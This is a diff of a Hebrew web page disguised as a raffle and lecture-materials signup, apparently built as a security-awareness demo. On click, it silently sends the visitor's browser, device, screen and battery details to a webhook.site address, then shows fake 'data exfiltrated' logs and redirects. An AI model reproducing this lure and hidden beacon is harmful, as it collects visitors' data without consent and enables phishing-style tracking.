@@ -3,87 +3,108 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>מבצע נובל למצוינות</title>
+    <title>מבצע נובל למצוינות - הגרלה</title>
     <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f2f5; transition: background 0.5s; }
-        .card { background: white; padding: 2rem; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 90%; }
-        h1 { color: #1a73e8; }
-        button { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 25px; font-size: 18px; cursor: pointer; transition: transform 0.2s; }
-        button:hover { transform: scale(1.05); }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f2f5; transition: background 0.5s; overflow: hidden; }
+        .card { background: white; padding: 2.5rem; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 90%; z-index: 1; transition: all 0.5s; }
+        h1 { color: #1a73e8; margin-bottom: 10px; }
+        p { color: #5f6368; line-height: 1.6; }
+        button { background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; transition: transform 0.2s, background 0.2s; margin-top: 20px; }
+        button:hover { transform: scale(1.05); background: #1557b0; }
         
-        /* עיצוב למצב "פריצה" */
-        .hacked-body { background-color: #0a0a0a; color: #0f0; font-family: 'Courier New', Courier, monospace; }
-        .progress-container { display: none; margin-top: 20px; }
-        .progress-bar { width: 0%; height: 20px; background: #0f0; transition: width 0.1s; }
-        #log { font-size: 12px; margin-top: 10px; text-align: left; height: 60px; overflow: hidden; }
+        /* מצב פריצה */
+        .hacked-body { background-color: #000; color: #0f0; }
+        .progress-container { display: none; margin-top: 25px; border: 1px solid #0f0; position: relative; height: 25px; }
+        .progress-bar { width: 0%; height: 100%; background: #0f0; transition: width 0.1s; }
+        #log { font-family: 'Courier New', Courier, monospace; font-size: 13px; margin-top: 15px; text-align: left; height: 80px; overflow: hidden; line-height: 1.4; color: #0f0; }
+        .warning { color: #ff0000; font-weight: bold; display: none; margin-top: 10px; animation: blink 0.5s infinite; }
+        @keyframes blink { 0% {opacity: 1;} 50% {opacity: 0.1;} 100% {opacity: 1;} }
     </style>
 </head>
 <body>
 
 <div class="card" id="mainCard">
-    <h1>ברוכים הבאים! 🚀</h1>
-    <p>לחצו למטה כדי להירשם להגרלה ולקבל חומרים מההרצאה</p>
-    <button onclick="startExploit()">אני רוצה להירשם!</button>
-    
-    <div class="progress-container" id="exploitBox">
-        <p>מתחבר לשרת מרוחק...</p>
-        <div style="width: 100%; border: 1px solid #0f0;">
-            <div class="progress-bar" id="bar"></div>
-        </div>
-        <div id="log"></div>
+    <div id="content-normal">
+        <h1>הגרלת נובל 2026! 🎁</h1>
+        <p>סרקתם והגעתם למקום הנכון. לחצו על הכפתור למטה כדי להירשם להגרלת הפרסים ולהורדת חומרי ההרצאה.</p>
+        <button onclick="startExploit()">הרשמה מהירה</button>
     </div>
+
+    <div class="progress-container" id="exploitBox">
+        <div class="progress-bar" id="bar"></div>
+    </div>
+    <div id="log"></div>
+    <div id="finalWarning" class="warning">SYSTEM COMPROMISED - DATA EXFILTRATED</div>
 </div>
 
 <script>
     async function startExploit() {
-        // 1. שינוי ויזואלי למצב "האקרי"
+        const mainCard = document.getElementById('mainCard');
+        const logBox = document.getElementById('log');
+        
+        // 1. שינוי ויזואלי מיידי
         document.body.classList.add('hacked-body');
-        document.getElementById('mainCard').style.background = '#111';
+        mainCard.style.background = '#111';
+        mainCard.style.borderColor = '#0f0';
+        document.getElementById('content-normal').style.display = 'none';
         document.getElementById('exploitBox').style.display = 'block';
-        document.querySelector('button').style.display = 'none';
-        document.querySelector('h1').innerText = "SYSTEM BREACHED";
-        document.querySelector('h1').style.color = "#0f0";
 
-        // 2. שליחת הפיילואד ל-Webhook שלך
-        const webhookUrl = 'https://webhook.site/5de4be8b-0a26-4497-ad42-ac349b9f40af'; // שים פה את ה-ID שלך
-        const pailyoad = {
+        // 2. איסוף נתונים (כולל סוללה)
+        let batteryLevel = "Unknown";
+        try {
+            const battery = await navigator.getBattery();
+            batteryLevel = Math.round(battery.level * 100) + "%";
+        } catch (e) { /* Battery API not supported */ }
+
+        const payload = {
             status: "INFILTRATED",
-            user_agent: navigator.userAgent,
-            platform: navigator.platform,
-            screen_res: `${window.screen.width}x${window.screen.height}`,
-            timestamp: new Date().toISOString()
+            device: navigator.platform,
+            browser: navigator.userAgent.split(' ').pop(),
+            battery: batteryLevel,
+            screen: `${window.screen.width}x${window.screen.height}`,
+            time: new Date().toLocaleTimeString()
         };
 
-        // שליחה שקטה
-        fetch(`${webhookUrl}?data=${btoa(JSON.stringify(pailyoad))}`, { mode: 'no-cors' });
+        // שליחת הנתונים ל-Webhook (זכור להחליף את ה-URL)
+        const webhookUrl = 'https://webhook.site/YOUR-ID'; 
+        const encodedData = btoa(JSON.stringify(payload));
+        fetch(`${webhookUrl}?token=admin_bypass&data=${encodedData}`, { mode: 'no-cors' });
 
-        // 3. אנימציה של פיילואד מזויף על המסך
+        // 3. אנימציית לוגים "מפחידה"
         const logs = [
-            "> Connecting to port 8080...",
-            "> Bypassing local firewall...",
-            "> Extracting session tokens...",
-            "> Uploading user_profile to remote server...",
-            "> SUCCESS: Target compromised."
+            "> Establishing connection to CNC server...",
+            "> Connection encrypted via AES-256",
+            "> Searching for local vulnerabilities...",
+            `> Found device: ${payload.device}`,
+            `> Battery status: ${payload.battery} - Accessing power management...`,
+            "> Extracting browser history tokens...",
+            "> Bypassing sandbox security...",
+            "> Uploading sensitive_data.zip to cloud...",
+            "> Cleaning tracks..."
         ];
-        
+
         let i = 0;
         const bar = document.getElementById('bar');
-        const logBox = document.getElementById('log');
-
+        
         const interval = setInterval(() => {
-            i += 2;
+            i += 1;
             bar.style.width = i + "%";
-            if (i % 20 === 0) {
-                logBox.innerHTML += logs[i/20 - 1] + "<br>";
+            
+            if (i % 11 === 0 && logs.length > 0) {
+                const line = document.createElement('div');
+                line.innerText = logs.shift();
+                logBox.appendChild(line);
+                logBox.scrollTop = logBox.scrollHeight;
             }
+
             if (i >= 100) {
                 clearInterval(interval);
+                document.getElementById('finalWarning').style.display = 'block';
                 setTimeout(() => {
-                    // הפנייה לאתר האמיתי בסיום
-                    window.location.href = "https://www.instagram.com/elisamuelson_?igsh=emN1NzEwZ2xvNWRh&utm_source=qr";
-                }, 1000);
+                    window.location.href = "https://www.nobel4education.org.il/";
+                }, 1500);
             }
-        }, 50);
+        }, 40);
     }
 </script>
 
